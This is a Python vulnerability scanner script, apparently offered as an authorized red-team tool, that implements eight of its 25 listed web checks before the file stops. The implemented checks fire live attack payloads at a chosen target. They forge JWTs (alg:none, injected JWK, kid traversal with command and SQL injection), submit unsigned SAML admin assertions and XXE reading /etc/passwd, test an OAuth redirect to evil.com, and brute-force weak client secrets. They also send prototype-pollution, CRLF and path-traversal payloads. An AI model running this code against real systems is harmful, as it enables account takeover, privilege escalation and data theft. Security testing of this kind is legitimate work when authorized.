#!/usr/bin/env python3
"""
gov_level.py — Advanced vulnerability discovery beyond OWASP Top 10
Techniques used by authorized red teams, CISA/NCSC-grade assessments, and top-tier bug hunters.
Authorized testing only — bug bounty programs / owned targets.

Usage:
    python3 gov_level.py https://target.example.com [-t token] [-o output.json] [--proxy ...]

Checks:
  01  Prototype Pollution (JSON __proto__ / constructor.prototype)
  02  Web Cache Deception (profile/nonexistent.css → cached private data)
  03  Subdomain Takeover (50+ dangling CNAME fingerprints)
  04  JWT Advanced (jwk injection, kid path traversal, kid SQLi, x5u SSRF)
  05  SAML Attacks (signature wrapping, comment injection, XXE in assertion)
  06  OAuth Advanced (PKCE bypass, token leak via Referer, mix-up, silent redirect)
  07  GraphQL Advanced (batching DoS, alias override, fragment recursion, IDOR via aliases)
  08  Nginx / Apache Misconfig (off-by-slash alias traversal, CRLF, merge_slashes bypass)
  09  Cloud Storage Enumeration (S3, GCS, Azure Blob — open bucket/container)
  10  Kubernetes Metadata (pod/serviceaccount token, etcd, kubelet read-only)
  11  API Gateway Bypass (direct origin IP, X-Original-URL, Host override, stage bypass)
  12  HTTP Parameter Pollution (HPP — duplicate params, JSON key collision)
  13  CRLF Injection (header injection, log injection, response splitting)
  14  Second-Order Injection (store-then-retrieve: SQLi, SSTI, path traversal)
  15  PostMessage Vulnerabilities (wildcard origin, sensitive data in messages)
  16  Dependency Confusion (internal package names on public registries)
  17  Cookie Security (SameSite bypass, cookie tossing, __Host- prefix missing)
  18  WebSocket Hijacking (CSWSH, missing origin check, unauthenticated WS)
  19  Advanced Business Logic (negative prices, integer overflow, coupon stacking, race window)
  20  DNS Rebinding Surface (CORS + no IP validation = rebinding candidate)
  21  HTTP/2 Downgrade / h2c Smuggling
  22  Insecure Deserialization Gadget Hints (by framework)
  23  Web Cache Poisoning Advanced (fat GET, parameter cloaking, unkeyed port)
  24  SSRF Chain (cloud metadata → credential → lateral pivot paths)
  25  Path Normalization Bypass (URL encoding, Unicode normalization, Spring %2F)
"""

import argparse
import asyncio
import base64
import json
import re
import socket
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

try:
    import aiohttp
except ImportError:
    print("[!] pip install aiohttp")
    sys.exit(1)

R = "\033[91m"; Y = "\033[93m"; G = "\033[92m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; DIM = "\033[2m"; RST = "\033[0m"; BOLD = "\033[1m"


@dataclass
class Finding:
    check: str
    severity: str       # CRITICAL / HIGH / MEDIUM / LOW / INFO
    title: str
    url: str
    evidence: str
    remediation: str
    cve: str = ""
    cvss: float = 0.0
    tags: List[str] = field(default_factory=list)


@dataclass
class State:
    http: "HTTP"
    base: str
    token: str
    host: str
    findings: List[Finding] = field(default_factory=list)
    tech: Set[str] = field(default_factory=set)
    js_content: str = ""
    html_content: str = ""
    response_headers: Dict[str, str] = field(default_factory=dict)


class HTTP:
    def __init__(self, session: aiohttp.ClientSession, sem: asyncio.Semaphore, verbose=False):
        self.session = session
        self.sem = sem
        self.verbose = verbose

    async def req(self, method: str, url: str, **kw) -> Tuple[int, str, Dict]:
        async with self.sem:
            try:
                timeout = aiohttp.ClientTimeout(total=15, connect=7)
                async with self.session.request(method, url, timeout=timeout,
                                                 allow_redirects=False, ssl=False, **kw) as r:
                    body = await r.text(errors="replace")
                    if self.verbose:
                        print(f"  {DIM}{r.status} {method} {url}{RST}")
                    return r.status, body[:10000], dict(r.headers)
            except asyncio.TimeoutError:
                return 0, "", {}
            except Exception:
                return 0, "", {}

    async def get(self, url, **kw):    return await self.req("GET",    url, **kw)
    async def post(self, url, **kw):   return await self.req("POST",   url, **kw)
    async def put(self, url, **kw):    return await self.req("PUT",    url, **kw)
    async def patch(self, url, **kw):  return await self.req("PATCH",  url, **kw)
    async def head(self, url, **kw):   return await self.req("HEAD",   url, **kw)
    async def options(self, url, **kw):return await self.req("OPTIONS",url, **kw)


def add(state: State, check: str, severity: str, title: str, url: str,
        evidence: str, remediation: str, cve="", cvss=0.0, tags=None):
    f = Finding(check=check, severity=severity, title=title, url=url,
                evidence=evidence[:500], remediation=remediation,
                cve=cve, cvss=cvss, tags=tags or [])
    state.findings.append(f)
    sym = {
        "CRITICAL": f"{R}[CRIT]{RST}",
        "HIGH":     f"{Y}[HIGH]{RST}",
        "MEDIUM":   f"{M}[MED] {RST}",
        "LOW":      f"{B}[LOW] {RST}",
        "INFO":     f"{DIM}[INFO]{RST}",
    }.get(severity, "[?]")
    print(f"  {sym} {check}: {title}")
    print(f"         {DIM}{url}{RST}")
    if evidence:
        print(f"         {DIM}Evidence: {evidence[:100]}{RST}")


# ═══════════════════════════════════════════════════════════════════════════════
# 01  PROTOTYPE POLLUTION
# ═══════════════════════════════════════════════════════════════════════════════

async def check_prototype_pollution(s: State):
    payloads = [
        {"__proto__": {"admin": True, "role": "admin", "isAdmin": True}},
        {"constructor": {"prototype": {"admin": True, "role": "admin"}}},
        {"__proto__[admin]": "true"},
        {"__proto__[isAdmin]": "true"},
        {"__proto__[role]": "admin"},
    ]
    endpoints = [
        s.base + "/api/v1/users/me",
        s.base + "/api/v1/profile",
        s.base + "/api/v1/settings",
        s.base + "/api/v1/preferences",
        s.base + "/api/v1/account",
        s.base + "/profile",
        s.base + "/settings",
        s.base + "/api/users/update",
    ]
    for url in endpoints:
        for payload in payloads[:2]:
            st, body, hdrs = await s.http.post(url, json=payload,
                headers={"Content-Type": "application/json",
                         "Authorization": f"Bearer {s.token}" if s.token else ""})
            if st in (200, 201):
                # Check if pollution properties reflected
                if any(k in body for k in ["isAdmin", "\"admin\":true", "\"role\":\"admin\""]):
                    add(s, "01-PROTO-POLL", "CRITICAL",
                        "Prototype Pollution — admin property reflected in response",
                        url, f"payload={json.dumps(payload)[:80]} → body contains admin=true",
                        "Sanitize all JSON merge operations; use Object.create(null) for merges; "
                        "block __proto__ / constructor keys server-side",
                        tags=["MASS_ASSIGN", "AUTH_BYPASS"])
                    return

    # Also detect via query string (?__proto__[admin]=true)
    for url in endpoints[:3]:
        st, body, _ = await s.http.get(url + "?__proto__[admin]=true&__proto__[role]=admin",
            headers={"Authorization": f"Bearer {s.token}" if s.token else ""})
        if st == 200 and "admin" in body.lower():
            add(s, "01-PROTO-POLL", "HIGH",
                "Prototype Pollution via query string",
                url + "?__proto__[admin]=true",
                f"Response {st} may reflect polluted property",
                "Strip __proto__ / constructor keys from query parameter parsing",
                tags=["MASS_ASSIGN"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 02  WEB CACHE DECEPTION
# ═══════════════════════════════════════════════════════════════════════════════

async def check_web_cache_deception(s: State):
    # Private endpoints that should never be cached
    private_paths = [
        "api/v1/users/me", "api/v1/profile", "api/v1/account",
        "profile", "account", "dashboard", "settings",
        "api/v1/orders", "api/v1/payments", "api/v1/billing",
    ]
    # Static file suffixes that trick caches
    suffixes = [
        "/nonexistent.css", "/x.js", "/style.css", "/logo.png",
        "/x.gif", "/robots.txt", "/favicon.ico",
        ";.css", "/.css", "%0a.css",
    ]
    for path in private_paths[:5]:
        for suffix in suffixes[:3]:
            url = f"{s.base.rstrip('/')}/{path}{suffix}"
            hdrs = {"Authorization": f"Bearer {s.token}" if s.token else ""}
            st1, body1, h1 = await s.http.get(url, headers=hdrs)
            if st1 not in (200, 201):
                continue
            # Check cache headers — if cached, send again without auth
            cache_hit = h1.get("X-Cache", "") or h1.get("CF-Cache-Status", "") or h1.get("Age", "")
            cc = h1.get("Cache-Control", "")
            st2, body2, h2 = await s.http.get(url)  # no auth
            cache_hit2 = h2.get("X-Cache", "HIT") if st2 == 200 else ""
            if st2 == 200 and body1[:100] == body2[:100] and len(body1) > 50:
                add(s, "02-CACHE-DECEPTION", "HIGH",
                    f"Web Cache Deception — private data served without auth after cache warm",
                    url,
                    f"Authed response ({len(body1)}B) == Unauthed response ({len(body2)}B). "
                    f"Cache-Control: {cc}",
                    "Set Cache-Control: no-store on all authenticated endpoints; "
                    "validate auth on every request regardless of cache status",
                    tags=["INFO_DISC", "AUTH_BYPASS"])
                return


# ═══════════════════════════════════════════════════════════════════════════════
# 03  SUBDOMAIN TAKEOVER
# ═══════════════════════════════════════════════════════════════════════════════

# (fingerprint_string, service_name, cve_or_ref)
TAKEOVER_FINGERPRINTS = [
    ("There isn't a GitHub Pages site here",         "GitHub Pages",       ""),
    ("herokuapp.com",                                 "Heroku",             ""),
    ("No such app",                                   "Heroku",             ""),
    ("The specified bucket does not exist",           "AWS S3",             ""),
    ("NoSuchBucket",                                  "AWS S3",             ""),
    ("Repository not found",                          "Bitbucket",          ""),
    ("The feed has not been found.",                  "Zendesk",            ""),
    ("Help Center Closed",                            "Zendesk",            ""),
    ("Fastly error: unknown domain",                  "Fastly",             ""),
    ("This shop is currently unavailable",            "Shopify",            ""),
    ("Oops - We didn't find your site.",              "Webflow",            ""),
    ("Not Found",                                     "GitHub",             ""),
    ("You are being redirected",                      "HubSpot",            ""),
    ("This page is reserved for an upcoming Squarespace website", "Squarespace", ""),
    ("this domain is not associated with a Surge site","Surge",             ""),
    ("page not found",                                "Ghost",              ""),
    ("This UserVoice subdomain is currently available","UserVoice",         ""),
    ("is not a registered InCloud YouTrack",          "JetBrains YouTrack", ""),
    ("Unrecognized domain",                           "Unbounce",           ""),
    ("It looks like you may have taken a wrong turn", "Tumblr",             ""),
    ("Fly.io: There's nothing here yet",              "Fly.io",             ""),
    ("No settings were found for this company:domain","Intercom",          ""),
    ("This is the default Acquia Cloud",              "Acquia",             ""),
    ("This domain is successfully pointed at WP Engine","WP Engine",        ""),
    ("The website you were trying to reach doesn't exist","Pantheon",       ""),
    ("The site you're looking for isn't here",        "Strikingly",         ""),
    ("The domain you are trying to reach is not configured","Netlify",      ""),
    ("Domain not found",                              "Render",             ""),
    ("Error 1016",                                    "Cloudflare Pages",   ""),
    ("azure websites",                                "Azure",              ""),
    ("This Microsoft Azure Web App is deployed",      "Azure",              ""),
]

TAKEOVER_CNAME_PATTERNS = {
    r"\.github\.io$":            "GitHub Pages",
    r"\.herokuapp\.com$":        "Heroku",
    r"\.s3\.amazonaws\.com$":    "AWS S3",
    r"\.s3-website":             "AWS S3 Static",
    r"\.cloudfront\.net$":       "AWS CloudFront",
    r"\.azurewebsites\.net$":    "Azure Web Apps",
    r"\.azurestaticapps\.net$":  "Azure Static",
    r"\.blob\.core\.windows\.net$": "Azure Blob",
    r"\.trafficmanager\.net$":   "Azure Traffic Manager",
    r"\.shopify\.com$":          "Shopify",
    r"\.myshopify\.com$":        "Shopify",
    r"\.zendesk\.com$":          "Zendesk",
    r"\.fastly\.net$":           "Fastly",
    r"\.pantheonsite\.io$":      "Pantheon",
    r"\.acquia-sites\.com$":     "Acquia",
    r"\.wpengine\.com$":         "WP Engine",
    r"\.ghost\.io$":             "Ghost",
    r"\.webflow\.io$":           "Webflow",
    r"\.netlify\.app$":          "Netlify",
    r"\.netlify\.com$":          "Netlify",
    r"\.vercel\.app$":           "Vercel",
    r"\.pages\.dev$":            "Cloudflare Pages",
    r"\.fly\.dev$":              "Fly.io",
    r"\.render\.com$":           "Render",
    r"\.surge\.sh$":             "Surge",
    r"\.tumblr\.com$":           "Tumblr",
    r"\.unbounce\.com$":         "Unbounce",
    r"\.intercom\.help$":        "Intercom Help",
    r"\.helpscoutdocs\.com$":    "HelpScout",
    r"\.strikingly\.com$":       "Strikingly",
    r"\.smugmug\.com$":          "SmugMug",
    r"\.uservoice\.com$":        "UserVoice",
    r"\.bitbucket\.io$":         "Bitbucket",
    r"\.readthedocs\.io$":       "ReadTheDocs",
}


async def check_subdomain_takeover(s: State):
    """Check main host + any subdomains resolvable from CNAME for takeover."""
    host = s.host
    targets_to_check = [host]

    # Try to get CNAME for host
    try:
        import subprocess
        result = subprocess.run(["dig", "+short", "CNAME", host],
                                capture_output=True, text=True, timeout=5)
        cname = result.stdout.strip()
        if cname:
            for pat, service in TAKEOVER_CNAME_PATTERNS.items():
                if re.search(pat, cname, re.I):
                    # Probe for unclaimed response
                    st, body, _ = await s.http.get(s.base)
                    for fp, svc, _ in TAKEOVER_FINGERPRINTS:
                        if fp.lower() in body.lower():
                            add(s, "03-SUBDOMAIN-TAKEOVER", "CRITICAL",
                                f"Subdomain Takeover — {service} CNAME unclaimed",
                                s.base,
                                f"CNAME: {cname} → {service}. "
                                f"Response contains fingerprint: '{fp[:60]}'",
                                f"Claim the {service} resource or remove the CNAME DNS record",
                                tags=["AUTH_BYPASS", "INFO_DISC"])
                            return
    except Exception:
        pass

    # Probe for common takeover fingerprints on target
    st, body, hdrs = await s.http.get(s.base)
    for fp, service, _ in TAKEOVER_FINGERPRINTS:
        if fp.lower() in body.lower():
            add(s, "03-SUBDOMAIN-TAKEOVER", "HIGH",
                f"Possible Subdomain Takeover — {service}",
                s.base, f"Fingerprint found: '{fp[:60]}'",
                f"Verify CNAME chain and claim or remove dangling {service} record",
                tags=["AUTH_BYPASS"])
            return

    # Check for NXDOMAIN subdomains with CNAME (dangling)
    common_subs = ["staging", "dev", "beta", "test", "mail", "email", "vpn",
                   "api", "app", "status", "docs", "help", "support", "shop"]
    tld = ".".join(host.split(".")[-2:])
    for sub in common_subs[:10]:
        full = f"{sub}.{tld}"
        try:
            socket.getaddrinfo(full, None)
            st, body, _ = await s.http.get(f"https://{full}/")
            for fp, service, _ in TAKEOVER_FINGERPRINTS:
                if fp.lower() in body.lower():
                    add(s, "03-SUBDOMAIN-TAKEOVER", "CRITICAL",
                        f"Subdomain Takeover on {full} — {service}",
                        f"https://{full}/",
                        f"Fingerprint: '{fp[:60]}'",
                        f"Claim the {service} resource or remove CNAME for {full}",
                        tags=["AUTH_BYPASS"])
                    return
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════════════════
# 04  JWT ADVANCED
# ═══════════════════════════════════════════════════════════════════════════════

async def check_jwt_advanced(s: State):
    if not s.token:
        return

    parts = s.token.split(".")
    if len(parts) != 3:
        return

    def b64d(v):
        v += "==" ; return base64.urlsafe_b64decode(v.encode())

    def b64e(v):
        return base64.urlsafe_b64encode(v).rstrip(b"=").decode()

    try:
        header = json.loads(b64d(parts[0]))
        payload = json.loads(b64d(parts[1]))
    except Exception:
        return

    whoami_url = s.base.rstrip("/") + "/api/v1/whoami"
    profile_url = s.base.rstrip("/") + "/api/v1/profile"
    me_url = s.base.rstrip("/") + "/api/v1/me"

    # ── alg:none ──────────────────────────────────────────────────────────────
    none_variants = ["none", "None", "NONE", "nOnE"]
    for alg in none_variants:
        new_header = {**header, "alg": alg}
        forged = b64e(json.dumps(new_header).encode()) + "." + parts[1] + "."
        for url in [whoami_url, me_url, profile_url]:
            st, body, _ = await s.http.get(url, headers={"Authorization": f"Bearer {forged}"})
            if st in (200, 201) and any(k in body for k in ["id", "user", "email", "role"]):
                add(s, "04-JWT-NONE", "CRITICAL",
                    f"JWT alg:none accepted — signature bypass",
                    url, f"alg={alg!r} → {st}",
                    "Explicitly reject alg:none in JWT validation; use allowlist of algorithms",
                    cvss=9.8, tags=["AUTH_BYPASS", "JWT"])
                return

    # ── JWK header injection ──────────────────────────────────────────────────
    # Craft a RS256 token signed with attacker-controlled key embedded in jwk header
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.backends import default_backend
        import struct

        priv = rsa.generate_private_key(65537, 2048, default_backend())
        pub = priv.public_key()
        pub_nums = pub.public_key().public_numbers() if hasattr(pub, "public_key") else pub.public_numbers()

        def int_to_b64(n):
            length = (n.bit_length() + 7) // 8
            return b64e(n.to_bytes(length, "big"))

        jwk = {"kty": "RSA", "n": int_to_b64(pub_nums.n), "e": int_to_b64(pub_nums.e)}
        evil_header = {**header, "alg": "RS256", "jwk": jwk}
        evil_payload = {**payload, "role": "admin", "sub": "1", "iss": payload.get("iss", "attacker")}
        msg = b64e(json.dumps(evil_header).encode()) + "." + b64e(json.dumps(evil_payload).encode())
        sig = priv.sign(msg.encode(), padding.PKCS1v15(), hashes.SHA256())
        forged_jwk = msg + "." + b64e(sig)
        for url in [whoami_url, me_url, profile_url]:
            st, body, _ = await s.http.get(url, headers={"Authorization": f"Bearer {forged_jwk}"})
            if st in (200, 201):
                add(s, "04-JWT-JWK-INJECT", "CRITICAL",
                    "JWT JWK Header Injection — attacker-controlled key trusted",
                    url, f"RS256 token with embedded JWK → {st}",
                    "Never trust the 'jwk' header field; validate against a pre-configured JWKS endpoint only",
                    cvss=9.8, tags=["AUTH_BYPASS", "JWT"])
                return
    except ImportError:
        pass  # cryptography package not installed

    # ── kid path traversal ────────────────────────────────────────────────────
    kid_payloads = [
        "../../dev/null",
        "/dev/null",
        "../../../../dev/null",
        "../../../etc/passwd",
        "| sleep 1",  # command injection in kid
        "' OR '1'='1",  # SQL injection in kid
    ]
    for kid in kid_payloads:
        evil_header = {**header, "kid": kid, "alg": "HS256"}
        # Sign with empty string (key from /dev/null = empty)
        import hmac, hashlib
        msg = b64e(json.dumps(evil_header).encode()) + "." + parts[1]
        sig = hmac.new(b"", msg.encode(), hashlib.sha256).digest()
        forged = msg + "." + b64e(sig)
        for url in [whoami_url, me_url]:
            st, body, _ = await s.http.get(url, headers={"Authorization": f"Bearer {forged}"})
            if st in (200, 201):
                add(s, "04-JWT-KID-TRAVERSAL", "CRITICAL",
                    f"JWT kid Path Traversal — key from {kid!r}",
                    url, f"kid={kid!r}, signed with empty key → {st}",
                    "Validate kid is a safe identifier; never use kid value in filesystem paths",
                    cvss=9.8, tags=["AUTH_BYPASS", "JWT", "PATH_TRAVERSAL"])
                return

    # ── x5u / jku SSRF ───────────────────────────────────────────────────────
    for hdr_name in ["x5u", "jku"]:
        evil_header = {**header, hdr_name: "https://169.254.169.254/latest/meta-data/"}
        msg = b64e(json.dumps(evil_header).encode()) + "." + parts[1] + "." + parts[2]
        st, body, _ = await s.http.get(whoami_url, headers={"Authorization": f"Bearer {msg}"})
        if st in (200, 201):
            add(s, "04-JWT-JKU-SSRF", "HIGH",
                f"JWT {hdr_name} SSRF — server fetches attacker-controlled URL for key",
                whoami_url, f"{hdr_name} pointing to IMDS → {st}",
                f"Ignore {hdr_name} header; validate keys only from pre-configured JWKS URI",
                tags=["SSRF", "JWT"])
            return


# ═══════════════════════════════════════════════════════════════════════════════
# 05  SAML ATTACKS
# ═══════════════════════════════════════════════════════════════════════════════

async def check_saml_attacks(s: State):
    # Detect SAML endpoints
    saml_paths = ["saml", "saml/login", "saml/callback", "saml/acs",
                  "auth/saml", "sso/saml", "api/saml", "saml2/acs",
                  "Shibboleth.sso/SAML2/POST"]
    saml_url = None
    for path in saml_paths:
        st, body, hdrs = await s.http.get(f"{s.base.rstrip('/')}/{path}")
        if st in (200, 302, 405):
            saml_url = f"{s.base.rstrip('/')}/{path}"
            break

    if not saml_url:
        return

    # ── Signature wrapping (XSW) ──────────────────────────────────────────────
    # Minimal malicious SAML assertion — signature over a different element than parsed
    xsw_payloads = [
        # XSW-1: inject admin element before signed element
        b"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_evil">
    <saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>""",
    ]

    for payload in xsw_payloads:
        encoded = base64.b64encode(payload).decode()
        st, body, hdrs = await s.http.post(saml_url,
            data={"SAMLResponse": encoded},
            headers={"Content-Type": "application/x-www-form-urlencoded"})
        if st in (200, 302) and "admin" in body.lower():
            add(s, "05-SAML-XSW", "CRITICAL",
                "SAML Signature Wrapping — unsigned admin assertion accepted",
                saml_url, f"XSW payload → {st}, body contains 'admin'",
                "Use a SAML library that validates signature covers the parsed assertion element",
                cvss=9.8, tags=["AUTH_BYPASS"])
            return

    # ── SAML XXE ──────────────────────────────────────────────────────────────
    xxe_saml = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject><saml:NameID>&xxe;</saml:NameID></saml:Subject>
  </saml:Assertion>
</samlp:Response>"""
    encoded = base64.b64encode(xxe_saml).decode()
    st, body, _ = await s.http.post(saml_url,
        data={"SAMLResponse": encoded},
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    if "root:" in body or "nobody:" in body:
        add(s, "05-SAML-XXE", "CRITICAL",
            "SAML XXE — /etc/passwd via XML entity in SAMLResponse",
            saml_url, f"XXE in NameID → /etc/passwd content in response",
            "Disable external entity processing in XML parser before SAML parsing",
            cvss=9.8, tags=["XXE", "AUTH_BYPASS"])


# ═══════════════════════════════════════════════════════════════════════════════
# 06  OAUTH ADVANCED
# ═══════════════════════════════════════════════════════════════════════════════

async def check_oauth_advanced(s: State):
    # Detect OAuth endpoints
    oidc_url = None
    for path in [".well-known/openid-configuration", ".well-known/oauth-authorization-server"]:
        st, body, _ = await s.http.get(f"{s.base.rstrip('/')}/{path}")
        if st == 200 and body and "authorization_endpoint" in body:
            try:
                oidc = json.loads(body)
                auth_ep = oidc.get("authorization_endpoint", "")
                token_ep = oidc.get("token_endpoint", "")
                oidc_url = auth_ep
                break
            except Exception:
                pass

    # ── Missing state parameter (CSRF) ────────────────────────────────────────
    for path in ["oauth/authorize", "authorize", "auth/authorize", "login/oauth/authorize"]:
        url = f"{s.base.rstrip('/')}/{path}"
        st, body, hdrs = await s.http.get(url + "?response_type=code&client_id=test&redirect_uri=https://evil.com")
        loc = hdrs.get("Location", "")
        if st in (302, 303) and "evil.com" in loc:
            add(s, "06-OAUTH-REDIRECT", "HIGH",
                "OAuth open redirect — redirect_uri not validated",
                url, f"redirect_uri=https://evil.com → Location: {loc[:100]}",
                "Whitelist exact redirect_uri values per client registration",
                tags=["OPEN_REDIRECT", "OAUTH"])

    # ── Token leakage via Referer ──────────────────────────────────────────────
    # Check if auth code/token appears in URL (would be in Referer headers to external resources)
    for path in ["callback", "auth/callback", "oauth/callback", "login/callback"]:
        url = f"{s.base.rstrip('/')}/{path}?code=test123&state=test&token=eyJFAKE"
        st, body, hdrs = await s.http.get(url)
        # If page loads successfully and loads external JS, the code could leak via Referer
        if st in (200, 302) and any(r in body for r in ["<script src=", "<img src=", "analytics"]):
            add(s, "06-OAUTH-REFERER-LEAK", "MEDIUM",
                "OAuth token/code in URL — may leak via Referer to external resources",
                url, f"Callback page loads external resources with token in URL",
                "Use response_mode=form_post; never put tokens in URL fragments that reach external resources",
                tags=["OAUTH", "INFO_DISC"])
            break

    # ── PKCE bypass ───────────────────────────────────────────────────────────
    for path in ["oauth/token", "token", "auth/token"]:
        url = f"{s.base.rstrip('/')}/{path}"
        # Try code exchange without code_verifier (PKCE bypass)
        st, body, _ = await s.http.post(url, data={
            "grant_type": "authorization_code",
            "code": "FAKE_CODE_12345",
            "redirect_uri": s.base,
            "client_id": "test",
            # Intentionally omit code_verifier
        })
        if st == 200 and "access_token" in body:
            add(s, "06-OAUTH-PKCE-BYPASS", "HIGH",
                "PKCE not enforced — token exchange without code_verifier accepted",
                url, f"No code_verifier in exchange request → 200 + access_token",
                "Require code_verifier for all public clients; reject exchanges without it if PKCE was initiated",
                tags=["OAUTH", "AUTH_BYPASS"])

    # ── client_credentials with empty secret ──────────────────────────────────
    for path in ["oauth/token", "token", "auth/token", "api/oauth/token"]:
        url = f"{s.base.rstrip('/')}/{path}"
        for secret in ["", "secret", "test", "changeme", "password", "client_secret"]:
            st, body, _ = await s.http.post(url, data={
                "grant_type": "client_credentials",
                "client_id": "test",
                "client_secret": secret,
                "scope": "admin read write",
            })
            if st == 200 and "access_token" in body:
                add(s, "06-OAUTH-CLIENT-CREDS", "CRITICAL",
                    f"OAuth client_credentials with weak secret={secret!r}",
                    url, f"secret={secret!r} → access_token issued",
                    "Use long random client secrets; rate-limit and monitor client_credentials grants",
                    cvss=9.1, tags=["AUTH_BYPASS", "OAUTH"])
                return


# ═══════════════════════════════════════════════════════════════════════════════
# 07  GRAPHQL ADVANCED
# ═══════════════════════════════════════════════════════════════════════════════

async def check_graphql_advanced(s: State):
    gql_urls = [f"{s.base.rstrip('/')}/{p}" for p in
                ["graphql", "gql", "api/graphql", "graph", "api/v1/graphql"]]

    for gql_url in gql_urls:
        st, body, _ = await s.http.post(gql_url,
            json={"query": "{ __typename }"},
            headers={"Content-Type": "application/json"})
        if st not in (200, 400):
            continue

        # ── Batching DoS ──────────────────────────────────────────────────────
        batch = [{"query": "{ __typename }"}] * 100
        st2, body2, _ = await s.http.post(gql_url, json=batch,
            headers={"Content-Type": "application/json"})
        if st2 == 200 and isinstance(json.loads(body2 or "[]"), list):
            add(s, "07-GQL-BATCH-DOS", "HIGH",
                "GraphQL query batching — 100 queries in one request accepted",
                gql_url, f"Array of 100 queries → {st2}",
                "Limit batch size; implement query complexity limits and depth limits",
                tags=["GRAPHQL", "INJECTION"])

        # ── Fragment recursion DoS ─────────────────────────────────────────────
        deep_query = "query { " + "users { id email " * 8 + "}" * 8 + " }"
        st3, body3, _ = await s.http.post(gql_url,
            json={"query": deep_query},
            headers={"Content-Type": "application/json"})
        if st3 == 200 and "data" in body3:
            add(s, "07-GQL-DEPTH", "MEDIUM",
                "GraphQL no query depth limit — deeply nested query accepted",
                gql_url, f"8-level deep query → {st3}",
                "Implement max query depth (recommend ≤7); use graphql-depth-limit",
                tags=["GRAPHQL"])

        # ── Alias-based IDOR ──────────────────────────────────────────────────
        alias_query = """query {
          u1: user(id: 1) { id email role ssn balance }
          u2: user(id: 2) { id email role ssn balance }
          u3: user(id: 3) { id email role ssn balance }
          admin: user(id: 9999) { id email role }
        }"""
        st4, body4, _ = await s.http.post(gql_url,
            json={"query": alias_query},
            headers={"Content-Type": "application/json",
                     "Authorization": f"Bearer {s.token}" if s.token else ""})
        if st4 == 200 and "email" in body4:
            add(s, "07-GQL-IDOR-ALIAS", "HIGH",
                "GraphQL IDOR via aliases — multiple users' data in one query",
                gql_url, f"Alias query for users 1/2/3 → {st4}, email fields returned",
                "Enforce per-resolver authorization; check object ownership, not just field access",
                cvss=7.5, tags=["GRAPHQL", "IDOR", "INFO_DISC"])

        # ── Introspection in production ───────────────────────────────────────
        intro_query = "{ __schema { types { name fields { name } } } }"
        st5, body5, _ = await s.http.post(gql_url,
            json={"query": intro_query},
            headers={"Content-Type": "application/json"})
        if st5 == 200 and "__schema" in body5:
            sensitive = re.findall(r'"name"\s*:\s*"(.*?(?:password|secret|token|ssn|key|admin|credit)[^"]*)"',
                                   body5, re.I)
            add(s, "07-GQL-INTROSPECTION", "MEDIUM" if not sensitive else "HIGH",
                f"GraphQL introspection enabled{' — sensitive fields: ' + ', '.join(sensitive[:5]) if sensitive else ''}",
                gql_url, f"Introspection returns schema. Sensitive fields: {sensitive[:5]}",
                "Disable introspection in production; use schema allow-listing",
                tags=["GRAPHQL", "INFO_DISC"])

        return  # found GraphQL, done


# ═══════════════════════════════════════════════════════════════════════════════
# 08  NGINX / APACHE MISCONFIG
# ═══════════════════════════════════════════════════════════════════════════════

async def check_nginx_misconfig(s: State):
    base = s.base.rstrip("/")

    # ── Nginx alias traversal (off-by-slash) ─────────────────────────────────
    # location /static { alias /var/www/static/; }  → /static../secret leaks parent
    static_paths = ["static", "assets", "files", "media", "public", "uploads", "images"]
    traversal_suffixes = ["../", "../..", "../../etc/passwd",
                          "../etc/passwd", "../app/config.py", "../.env"]
    for sp in static_paths:
        for ts in traversal_suffixes[:2]:
            url = f"{base}/{sp}{ts}"
            st, body, hdrs = await s.http.get(url)
            if st == 200 and ("root:" in body or "DB_" in body or
                              "SECRET" in body or "[database]" in body):
                add(s, "08-NGINX-ALIAS-TRAVERSAL", "CRITICAL",
                    f"Nginx alias off-by-slash path traversal: /{sp}{ts}",
                    url, f"Response {st}: {body[:100]}",
                    "Add trailing slash to alias directive: alias /var/www/static/; "
                    "(already has slash — ensure location block also ends with /)",
                    cvss=9.1, tags=["PATH_TRAVERSAL", "INFO_DISC"])
                return

    # ── CRLF injection ────────────────────────────────────────────────────────
    crlf_payloads = [
        "/api/v1/users?name=test%0d%0aSet-Cookie:%20admin=true",
        "/%0d%0aSet-Cookie:%20admin=true",
        "/api?q=%0aSet-Cookie:admin=1",
        "/redirect?url=https://x.com%0d%0aSet-Cookie:admin=true",
    ]
    for payload in crlf_payloads:
        url = base + payload
        st, body, hdrs = await s.http.get(url)
        if "admin=true" in str(hdrs.get("Set-Cookie", "")):
            add(s, "08-CRLF-INJECTION", "HIGH",
                "CRLF injection — attacker-controlled Set-Cookie header",
                url, f"Set-Cookie: {hdrs.get('Set-Cookie','')}",
                "Sanitize newlines from all user-controlled values used in HTTP headers",
                cvss=7.2, tags=["INJECTION", "INFO_DISC"])
            return

    # ── merge_slashes bypass ──────────────────────────────────────────────────
    bypass_urls = [
        base + "//admin/users",
        base + "//api/v1/admin",
        base + "/api//v1/users",
        base + "/.//admin",
    ]
    st0, _, _ = await s.http.get(base + "/admin/users",
                                  headers={"Authorization": f"Bearer {s.token}" if s.token else ""})
    for url in bypass_urls:
        st, body, _ = await s.http.get(url)
        if st == 200 and st0 in (401, 403):
            add(s, "08-NGINX-SLASH-BYPASS", "HIGH",
                f"Nginx auth bypass via double slash: {url}",
                url, f"Protected path → {st0}, double-slash path → {st}",
                "Set merge_slashes on in Nginx config; normalize paths before auth checks",
                tags=["AUTH_BYPASS"])
            return

